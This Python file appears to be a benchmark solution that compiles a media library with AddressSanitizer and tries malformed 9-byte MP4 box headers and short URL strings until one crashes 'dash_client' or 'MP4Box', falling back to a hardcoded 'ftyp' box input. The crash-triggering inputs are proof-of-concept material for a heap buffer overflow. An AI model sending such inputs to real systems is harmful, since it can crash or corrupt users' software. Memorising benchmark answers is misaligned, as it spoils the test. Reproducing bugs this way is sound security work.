import os
import sys
import subprocess
import tarfile
import tempfile
import shutil
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Strategy:
        1. Compile the provided source code with AddressSanitizer (ASAN).
        2. Identify the target binary (`dash_client`).
        3. Fuzz the binary with a set of heuristics optimized for a 9-byte heap buffer overflow.
           - Focus on malformed MP4 box headers (size 9 means 1 byte payload, likely causing OOB read).
           - Focus on short strings.
        4. If compilation fails or no crash is found, return a high-probability hardcoded PoC.
        """
        
        # High probability fallback: A malformed 'ftyp' box of size 9.
        # Structure: [Size: 4 bytes] [Type: 4 bytes] [Payload: 1 byte]
        # Valid ftyp usually requires at least 4 bytes of payload (Major Brand).
        # Reading beyond the 1 byte payload triggers Heap Buffer Overflow.
        fallback_poc = struct.pack('>I', 9) + b'ftyp' + b'\x00'
        
        work_dir = tempfile.mkdtemp()
        try:
            # 1. Extract source code
            with tarfile.open(src_path) as tar:
                tar.extractall(path=work_dir)
            
            # Locate source root (directory containing configure)
            src_root = work_dir
            for root, dirs, files in os.walk(work_dir):
                if 'configure' in files:
                    src_root = root
                    break
            
            # 2. Configure and Build
            env = os.environ.copy()
            flags = "-fsanitize=address -g"
            env['CFLAGS'] = flags
            env['CXXFLAGS'] = flags
            env['LDFLAGS'] = flags
            
            # Configure options to minimize build time and dependencies
            # We assume a standard build system (autoconf/make) common in oss-fuzz targets
            try:
                subprocess.run(
                    ['./configure', '--disable-x11', '--disable-gl', '--disable-qt'], 
                    cwd=src_root, env=env, check=True, 
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
                subprocess.run(
                    ['make', '-j8'], 
                    cwd=src_root, env=env, check=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                )
            except subprocess.CalledProcessError:
                # Build failed, return fallback
                return fallback_poc
            
            # 3. Locate the vulnerable binary
            target_bin = None
            for root, dirs, files in os.walk(src_root):
                if 'dash_client' in files:
                    path = os.path.join(root, 'dash_client')
                    if os.access(path, os.X_OK):
                        target_bin = path
                        break
            
            # If dash_client not found, check for MP4Box as fallback
            if not target_bin:
                for root, dirs, files in os.walk(src_root):
                    if 'MP4Box' in files:
                        path = os.path.join(root, 'MP4Box')
                        if os.access(path, os.X_OK):
                            target_bin = path
                            break
            
            if not target_bin:
                return fallback_poc

            # 4. Fuzz candidates
            # The ground truth is 9 bytes. We generate candidates of this length.
            candidates = []
            
            # Pattern A: Malformed Boxes (Length 9)
            # Box Header (8 bytes) + 1 byte payload
            box_types = [b'ftyp', b'moov', b'styp', b'free', b'skip', b'mdat']
            for bt in box_types:
                # Size 9
                candidates.append(struct.pack('>I', 9) + bt + b'\x00')
                candidates.append(struct.pack('>I', 9) + bt + b'\xFF')
                # Size 0 (extends to EOF) -> 8 bytes header + 1 byte payload = 9 bytes total
                # candidates.append(struct.pack('>I', 0) + bt + b'\x00') # This is actually > 9 bytes if file is larger, but here file is 9 bytes.

            # Pattern B: Short Strings (Length 9)
            candidates.append(b'http://aa')
            candidates.append(b'https://a')
            candidates.append(b'dash://aa')
            candidates.append(b'A' * 9)
            
            # Setup runtime environment (LD_LIBRARY_PATH) for dynamic libs
            run_env = os.environ.copy()
            bin_dir = os.path.dirname(target_bin)
            lib_path = run_env.get('LD_LIBRARY_PATH', '')
            run_env['LD_LIBRARY_PATH'] = f"{bin_dir}:{lib_path}"
            
            poc_path = os.path.join(work_dir, 'poc_candidate')
            
            for cand in candidates:
                with open(poc_path, 'wb') as f:
                    f.write(cand)
                
                try:
                    # Execute binary with candidate
                    res = subprocess.run(
                        [target_bin, poc_path],
                        env=run_env,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.PIPE,
                        timeout=1
                    )
                    
                    # Check for AddressSanitizer crash in stderr
                    if res.returncode != 0 and b"AddressSanitizer" in res.stderr:
                        return cand
                        
                except Exception:
                    continue

            # If no specific crash found, return the most likely fallback
            return fallback_poc

        except Exception:
            return fallback_poc
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)
